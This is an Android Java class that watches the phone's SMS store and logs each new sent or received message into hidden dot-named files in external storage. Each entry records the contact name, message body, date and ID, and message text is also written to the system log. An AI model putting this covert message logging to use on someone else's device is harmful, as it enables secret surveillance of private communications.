package com.jerrol.app.smsobserver;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.ContactsContract;
import android.speech.tts.TextToSpeech;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Created by Jerrol on 5/7/2017.
 */

public class SMSObserver extends ContentObserver {
    private static final String TAG = "SMSObserver";
    private Context context;

    private static final Uri uri = Uri.parse("content://sms");
    private static final String COLUMN_TYPE = "type";
    private static final int MESSAGE_TYPE_SENT = 2;
    private static final int MESSAGE_TYPE_RECEIVED = 1;

    private SimpleDateFormat sdf = new SimpleDateFormat("MM-dd-yyyy HH:mm:ss a", Locale.getDefault());

    private TextToSpeech textToSpeech;

    public SMSObserver(Handler handler, Context context) {
        super(handler);
        this.context = context;
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        Cursor cursor = null;

        try {
            cursor = context.getContentResolver().query(uri, null, null, null, "_id DESC");
            if (cursor != null && cursor.moveToFirst()) {
                int type = cursor.getInt(cursor.getColumnIndex(COLUMN_TYPE));
                Log.d(TAG, "Type: " + type);
                String writeText = "";
                String separator = "\n----------------------------------------------------------------------------------------------------";
                String senderName = "\nName: " + getContactName(cursor.getString(cursor.getColumnIndex("address")));
                String msgBody = "\nMessage: " + cursor.getString(cursor.getColumnIndex("body"));

                Date date = new Date(Long.parseLong(cursor.getString(cursor.getColumnIndex("date"))));

                String sDate = "\nDate: " + sdf.format(date);
                String sType = (type == MESSAGE_TYPE_SENT ? "\nSms Type: Sent" : "\nSms Type: Receive");
                String id = "\nID: " + cursor.getString(cursor.getColumnIndex("_id"));

                writeText += separator + senderName + msgBody + sDate + sType + id;

                String folderName = "." + sdf.format(date).substring(0, 10);
                String fileName = "." + getContactName(cursor.getString(cursor.getColumnIndex("address"))) + ".txt";

                File dir = new File(context.getExternalFilesDir(null), folderName);
                if(!dir.exists()) dir.mkdir();
                File file = new File(dir, fileName);

                boolean isMessageExists = false;
                try {
                    if(!file.exists()) file.createNewFile();

                    BufferedReader br = new BufferedReader(new FileReader(file));
                    String line;
                    while ((line = br.readLine()) != null) {
                        if (line.contains(cursor.getString(cursor.getColumnIndex("_id")))) {
                            isMessageExists = true;
                            break;
                        }
                    }
                    br.close();
                } catch (IOException ex) {
                    ex.printStackTrace();
                }

                FileOutputStream outputStream;
                if(!isMessageExists) {
                    try {
                        outputStream = new FileOutputStream(file, true);
                        outputStream.write(writeText.getBytes());
                        outputStream.close();
                        Log.i(TAG, writeText);
                    } catch (IOException ex) {
                        ex.printStackTrace();
                    }
                }
               /* String id = cursor.getString(cursor.getColumnIndex("_id"));
                SMSRecord smsRecord = new SMSRecord(id, sender, body, type);
                for (SMSRecord record : arrayList) {
                    if(!record.getID().equals(smsRecord.getID())) {
                        arrayList.add(smsRecord);
                    }
                }*/

                /*if (type == MESSAGE_TYPE_SENT) {
                    // Sent message
                    Log.d(TAG, "selfChange " + selfChange);
                    Log.d(TAG, "Message Sent ID: " + cursor.getString(cursor.getColumnIndex("_id")) );
                    Log.d(TAG, "Message Sent address: " + getContactName(cursor.getString(cursor.getColumnIndex("address"))) );

                    Log.d(TAG, "Message Sent body: " + cursor.getString(cursor.getColumnIndex("body")) );
                    Log.d(TAG, "Message Sent status: " + cursor.getString(cursor.getColumnIndex("status")) );
                    Log.d(TAG, "Message Sent type: " + cursor.getString(cursor.getColumnIndex("type")) );


                    Log.d(TAG, "Message sent date: " + sdf.format(date));
                } else if (type == MESSAGE_TYPE_RECEIVED) {
                    Log.d(TAG, "selfChange " + selfChange);
                    Log.d(TAG, "Message Receive ID: " + cursor.getString(cursor.getColumnIndex("_id")) );


                    String sender = getContactName(cursor.getString(cursor.getColumnIndex("address")));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    Log.d(TAG, "Message Receive address: " + sender);
                    Date date = new Date(Long.parseLong(cursor.getString(cursor.getColumnIndex("date"))));
                    Log.d(TAG, "Message Receive body: " + body );
                    Log.d(TAG, "Message Receive status: " + cursor.getString(cursor.getColumnIndex("status")) );
                    Log.d(TAG, "Message Receive type: " + cursor.getString(cursor.getColumnIndex("type")) );

                    SimpleDateFormat sdf = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss", Locale.getDefault());
                    Log.d(TAG, "Message Receive date: " + sdf.format(date));

                    *//*textToSpeech = new TextToSpeech(context, status -> {
                        if (status != TextToSpeech.ERROR) {
                            textToSpeech.setLanguage(Locale.ENGLISH);
                            String toSpeak = "You have receive a message from: " + sender;
                            toSpeak += ".\n He said, ";
                            toSpeak += "\n " + body;
                            //textToSpeech.speak(toSpeak, TextToSpeech.QUEUE_FLUSH, null, null);
                        }
                    });*//*
                }*/
            }
        } finally {
            if (cursor != null) {
                cursor.close();
                //Log.d(TAG, "Cursor closed");
                //textToSpeech.stop();
                //textToSpeech.shutdown();
                //context.getContentResolver().unregisterContentObserver(this);
            }
        }
    }

    @Override
    public boolean deliverSelfNotifications() {
        return true;
    }

    private String getContactName(String phoneNumber) {
        ContentResolver contentResolver = context.getContentResolver();
        Uri uri  = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
        Cursor cursor = contentResolver.query(uri, new String[] {ContactsContract.PhoneLookup.DISPLAY_NAME }, null, null, null);

        if(cursor == null) {
            return phoneNumber;
        }

        String contactName = null;
        if(cursor.moveToFirst()) {
            contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
        }

        if(!cursor.isClosed()) {
            cursor.close();
        }

        return contactName;
    }
}
